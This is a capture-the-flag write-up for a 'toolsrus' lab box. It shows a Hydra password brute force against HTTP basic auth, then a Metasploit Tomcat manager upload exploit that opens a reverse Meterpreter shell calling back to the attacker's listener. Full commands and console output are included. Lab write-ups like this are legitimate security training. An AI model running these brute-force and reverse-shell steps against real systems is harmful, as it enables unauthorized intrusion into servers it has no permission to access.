# toolsrus
---
## We are given a simple website that doesn't do anything
## Running dirbuster gives us the directories */guidelines* and */protected*, the latter having a basic http auth while the first hints that the one username could be *bob*
## Brute force using hydra

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.95.243 http-get /protected -V -I
```

## Bob's password is *bubbles*
## The /protected page tells us that *"This protected page has now moved to a different port."*
## Scanning with nmap gives us another web app on port 1234
## After analyzing it, we findd it is using an old version of Apache Tomcat
## We search for a metasploit exploit like this
## Very important for the payload to work is to also set the LHOST option to tun0
```bash
msf6 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 22, use 22 or use post/windows/gather/enum_tomcat

msf6 > use 17
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options 

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.17     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.95.243
RHOSTS => 10.10.95.243
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.8.98.92
LHOST => 10.8.98.92
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit 

[*] Started reverse TCP handler on 10.8.98.92:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying eHe0cSmIJKbU0J271yN0qZ...
[*] Executing eHe0cSmIJKbU0J271yN0qZ...
[*] Sending stage (58125 bytes) to 10.10.95.243
[*] Undeploying eHe0cSmIJKbU0J271yN0qZ ...
[*] Meterpreter session 1 opened (10.8.98.92:4444 -> 10.10.95.243:35750) at 2020-11-05 18:41:47 +0000

meterpreter > ls
```
## We got a shell
